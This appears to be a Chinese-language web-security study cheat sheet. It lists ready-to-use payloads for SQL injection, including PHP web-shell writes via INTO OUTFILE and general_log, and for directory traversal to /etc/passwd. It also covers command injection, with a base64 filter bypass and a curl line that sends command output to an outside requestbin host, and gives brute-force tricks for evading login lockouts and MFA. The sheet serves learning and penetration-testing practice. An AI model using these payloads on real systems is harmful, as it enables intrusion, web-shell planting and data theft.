# Web-Security-Cheatsheet

## SQL Injection

https://portswigger.net/web-security/sql-injection/cheat-sheet

### 目標

被放入 SQL 語句的資料如表單、參數、cookie 等

> 如果放在 http request 則要注意 url encode

### 基礎

- 欄位數:
  ```sql
  UNION SELECT NULL,NULL,NULL--
  ```
- 型別:
  ```sql
  UNION SELECT 'a',NULL,NULL--
  ```
- 合併不同欄位:
  ```sql
  UNION SELECT username || '~' || password FROM users--
  ```
- 合併同一欄位所有資料:
  ```sql
  UNION SELECT group_concat(username) FROM users--
  ```

#### 額外資料

- 資料庫名:
  ```sql
  SELECT table_schema FROM information_schema.schema
  ```
- 資料表名:
  ```sql
  SELECT table_name FROM information_schema.tables where table_schema == 'target'
  ```
- 欄位名:
  ```sql
  SELECT column_name FROM information_schema.columns WHERE table_name = 'users'
  ```
- 欄位型別:
  ```sql
  SELECT data_type FROM information_schema.columns WHERE table_name = 'users'`
  ```

### Blind SQL Injection

[範例](simple_blind_sql_injection.py)

- UNION-Based:
  ```sql
  AND (condition)--
  ```
- Error-Based:
  ```sql
  OR (SELECT CASE WHEN (condition) THEN 1/0 ELSE 1 END)--
  ```
- Time-Based:
  ```sql
  (SELECT CASE WHEN (condition) THEN sleep(3) ELSE sleep(0) END)--
  ```

### 檔案寫入

- ```sql
  SELECT '<?php exec($_GET["cmd"])' INTO OUTFILE '/var/www/html/shell.php'`
  ```
- ```sql
  SELECT '<?php exec($_GET["cmd"])' INTO DUMPFILE '/var/www/html/shell.php'
  ```
- ```sql
  set global general_log = on;
  set global general_log_file = '/var/www/html/shell.php';
  select '<?php exec($_GET["cmd"])'
  set global general_log = off;
  ```

## 認證

https://haveibeenpwned.com/

### 用戶名枚舉

- 狀態碼
- 錯誤訊息
- 回應時間

### 保護措施

- 鎖 IP

  - 如果同一個 IP 登入失敗太多次被鎖，可以讓一定成功的帳號和測試帳號相間做爆搜

- 鎖帳號

  - 不存在的帳號也許不會被鎖，可以用來做用戶名枚舉
  - 如果帳號實際上沒有被鎖，只是告訴你試了太多次，可以暴力破解

- 多因素驗證
  - 檢查還沒驗證完時可不可以使用帳戶功能
  - 如果驗證流程有缺陷勝制不用密碼，爆搜驗證碼就行了

### 其他登入相關功能

- 記得我: cookie 要保護好，如果 cookie 是由帳號密碼等資料組成則可以爆破，或是用其他技術竊取其他人的 cookie 離線爆破密碼

- 忘記密碼: 提交重置表單時也要驗證 token

- 更改密碼: 更改密碼頁面如果可被其他人找到，可用這個頁面爆搜密碼繞過登入頁面的保護

## 目錄遍歷

- 相對路徑: example.com/?file=../../../etc/passwd
- 絕對路徑: example.com/?file=/etc/passwd
- 特殊字串刪除: example.com/?file=....//....//....//etc/passwd
  > 假設刪除 `../`
- url encode 繞過: example.com/?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
- 特定資料夾開頭: example.com/?file=/var/www/images/../../../etc/passwd
- 副檔名: example.com/?file=../../../etc/passwd%00.png

## Command Injection

### 常用符號

- `a & b`: a 背景執行並執行 b
- `a && b`: a 成功後執行 b
- `a || b`: a 失敗後執行 b
- `a ; b`、`a \n b`: a 完成後執行 b

### 繞過 `.` 和 `/`

`ls $(echo Lwo= | base64 -d)`

> base64 decode 後會是字串，所以不能 `$(echo bHMgLwo= | base64 -d)`

### 無回顯

- `curl -d "$(ls /)" https://requestbin.io/xxx`
- `ls / > dump`

### 測試

`& ping -c 10 127.0.0.1 &`

> 成功會延遲十秒

